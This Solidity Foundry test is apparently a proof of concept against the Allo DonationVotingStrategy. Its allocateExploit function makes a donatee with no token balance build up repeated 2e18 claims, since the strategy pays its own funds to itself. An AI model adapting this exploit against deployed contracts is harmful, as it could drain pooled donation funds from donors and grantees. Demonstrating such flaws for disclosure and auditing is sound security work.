pragma solidity ^0.8.18;

import "forge-std/Test.sol";

import {DonationVotingStrategy} from
  "@allo/contracts/strategies/_poc/donation-voting/DonationVotingStrategy.sol";
import {Allo} from "@allo/contracts/core/Allo.sol";
import {Registry} from "@allo/contracts/core/Registry.sol";

import {PortalERC20} from "../PortalERC20.sol";
import {GitcoinDeployHelper} from "./GitcoinDeployHelper.sol";

contract GitcoinDeployment is Test {
  // Anvil Test-account 9: 0x2a871d0798f97d79848a013d4936a73bf4cc922c825d33c1cf7073dff6d409c6
  address constant MANAGER = address(0xa0Ee7A142d267C1f36714E4a8F75612F20a79720);

  Allo public ALLO;
  DonationVotingStrategy public strategy;
  uint256 public poolId;
  PortalERC20 public token;

  function deploy(bool _broadcast) public returns (GitcoinDeployHelper) {
    if (_broadcast) {
      vm.broadcast();
    }
    GitcoinDeployHelper helper = new GitcoinDeployHelper(MANAGER);

    poolId = helper.poolId();
    strategy = helper.strategy();
    ALLO = helper.allo();
    token = helper.token();

    emit log_named_address("Allo    ", address(ALLO));
    emit log_named_address("Strategy", address(strategy));
    emit log_named_address("Token   ", address(token));
    emit log_named_uint("Pool id ", poolId);
    emit log_named_address("Donatee ", address(helper));

    return helper;
  }

  function allocateExploit() public {
    // Minting 2e18 token into the strategy. notice the donatee have NO balance to allocate in the tx.
    // The allocation will make the strategy transfer its own funds to itself, while adding the claim
    // to the donatee.

    GitcoinDeployHelper helper = deploy(false);
    address donatee = address(helper);

    assertEq(token.balanceOf(donatee), 0);
    assertEq(strategy.claims(donatee, address(token)), 0);

    for (uint256 i = 0; i < 5; i++) {
      emit log("allocating 2e18 tokens to himself");
      assertEq(token.balanceOf(donatee), 0);

      vm.prank(donatee);
      ALLO.allocate(poolId, abi.encode(donatee, 2e18, address(token)));
      assertEq(strategy.claims(donatee, address(token)), 2e18 * (i + 1));
      emit log_named_decimal_uint("Claim Value", strategy.claims(donatee, address(token)), 18);
    }
  }
}
